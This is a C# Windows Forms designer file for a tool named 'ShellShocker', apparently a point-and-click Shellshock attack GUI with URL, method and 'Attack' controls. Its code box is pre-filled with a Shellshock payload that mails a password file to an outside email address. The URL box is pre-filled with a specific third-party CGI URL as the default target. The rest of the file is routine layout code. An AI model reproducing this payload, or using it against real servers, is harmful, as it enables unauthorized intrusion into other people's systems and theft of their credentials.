namespace ShellShocker
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.panel1 = new System.Windows.Forms.Panel();
            this.label1 = new System.Windows.Forms.Label();
            this.txbxURl = new System.Windows.Forms.TextBox();
            this.rxbxCode = new System.Windows.Forms.RichTextBox();
            this.label2 = new System.Windows.Forms.Label();
            this.btnAttack = new System.Windows.Forms.Button();
            this.label3 = new System.Windows.Forms.Label();
            this.cmbxMethod = new System.Windows.Forms.ComboBox();
            this.label4 = new System.Windows.Forms.Label();
            this.linkLabel1 = new System.Windows.Forms.LinkLabel();
            this.lnklblLoadsnpt = new System.Windows.Forms.LinkLabel();
            this.panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // panel1
            // 
            this.panel1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panel1.BackColor = System.Drawing.Color.Transparent;
            this.panel1.Controls.Add(this.lnklblLoadsnpt);
            this.panel1.Controls.Add(this.linkLabel1);
            this.panel1.Controls.Add(this.label4);
            this.panel1.Controls.Add(this.cmbxMethod);
            this.panel1.Controls.Add(this.label3);
            this.panel1.Controls.Add(this.btnAttack);
            this.panel1.Controls.Add(this.label2);
            this.panel1.Controls.Add(this.rxbxCode);
            this.panel1.Controls.Add(this.txbxURl);
            this.panel1.Controls.Add(this.label1);
            this.panel1.ForeColor = System.Drawing.Color.White;
            this.panel1.Location = new System.Drawing.Point(2, 2);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(645, 329);
            this.panel1.TabIndex = 0;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(22, 20);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(23, 15);
            this.label1.TabIndex = 0;
            this.label1.Text = "Url";
            // 
            // txbxURl
            // 
            this.txbxURl.ForeColor = System.Drawing.Color.Black;
            this.txbxURl.Location = new System.Drawing.Point(64, 12);
            this.txbxURl.Name = "txbxURl";
            this.txbxURl.Size = new System.Drawing.Size(424, 23);
            this.txbxURl.TabIndex = 1;
            this.txbxURl.Text = "http://sdbs.cloudapp.net/sdbs/cgi-bin/Introduction_jp.cgi";
            this.txbxURl.TextChanged += new System.EventHandler(this.txbxURl_TextChanged);
            // 
            // rxbxCode
            // 
            this.rxbxCode.ForeColor = System.Drawing.Color.Black;
            this.rxbxCode.Location = new System.Drawing.Point(64, 42);
            this.rxbxCode.Name = "rxbxCode";
            this.rxbxCode.Size = new System.Drawing.Size(424, 203);
            this.rxbxCode.TabIndex = 2;
            this.rxbxCode.Text = "() { :;}; mail -s \"This is hacked pass file \" myemail@mail.net | cat `/.secret/pa" +
    "sswd";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(25, 42);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(32, 15);
            this.label2.TabIndex = 3;
            this.label2.Text = "Code";
            // 
            // btnAttack
            // 
            this.btnAttack.ForeColor = System.Drawing.Color.Black;
            this.btnAttack.Location = new System.Drawing.Point(212, 282);
            this.btnAttack.Name = "btnAttack";
            this.btnAttack.Size = new System.Drawing.Size(75, 23);
            this.btnAttack.TabIndex = 4;
            this.btnAttack.Text = "Attack";
            this.btnAttack.UseVisualStyleBackColor = true;
            this.btnAttack.Click += new System.EventHandler(this.btnAttack_Click);
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(11, 250);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(45, 15);
            this.label3.TabIndex = 5;
            this.label3.Text = "Method";
            // 
            // cmbxMethod
            // 
            this.cmbxMethod.ForeColor = System.Drawing.Color.Black;
            this.cmbxMethod.FormattingEnabled = true;
            this.cmbxMethod.Items.AddRange(new object[] {
            "GET",
            "POST"});
            this.cmbxMethod.Location = new System.Drawing.Point(64, 250);
            this.cmbxMethod.Name = "cmbxMethod";
            this.cmbxMethod.Size = new System.Drawing.Size(424, 23);
            this.cmbxMethod.TabIndex = 6;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(495, 20);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(13, 15);
            this.label4.TabIndex = 7;
            this.label4.Text = "..";
            this.label4.TextChanged += new System.EventHandler(this.label4_TextChanged);
            // 
            // linkLabel1
            // 
            this.linkLabel1.AutoSize = true;
            this.linkLabel1.Location = new System.Drawing.Point(8, 306);
            this.linkLabel1.Name = "linkLabel1";
            this.linkLabel1.Size = new System.Drawing.Size(37, 15);
            this.linkLabel1.TabIndex = 8;
            this.linkLabel1.TabStop = true;
            this.linkLabel1.Text = "Coder";
            this.linkLabel1.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel1_LinkClicked);
            // 
            // lnklblLoadsnpt
            // 
            this.lnklblLoadsnpt.AutoSize = true;
            this.lnklblLoadsnpt.Location = new System.Drawing.Point(494, 230);
            this.lnklblLoadsnpt.Name = "lnklblLoadsnpt";
            this.lnklblLoadsnpt.Size = new System.Drawing.Size(13, 15);
            this.lnklblLoadsnpt.TabIndex = 9;
            this.lnklblLoadsnpt.TabStop = true;
            this.lnklblLoadsnpt.Text = "L";
            this.lnklblLoadsnpt.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.lnklblLoadsnpt_LinkClicked);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackgroundImage = global::ShellShocker.Properties.Resources.Megan;
            this.ClientSize = new System.Drawing.Size(649, 332);
            this.Controls.Add(this.panel1);
            this.Font = new System.Drawing.Font("Comic Sans MS", 8.25F);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Form1";
            this.Opacity = 0.9D;
            this.Text = "ShellShocker";
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.RichTextBox rxbxCode;
        private System.Windows.Forms.TextBox txbxURl;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Button btnAttack;
        private System.Windows.Forms.ComboBox cmbxMethod;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.LinkLabel linkLabel1;
        private System.Windows.Forms.LinkLabel lnklblLoadsnpt;
    }
}

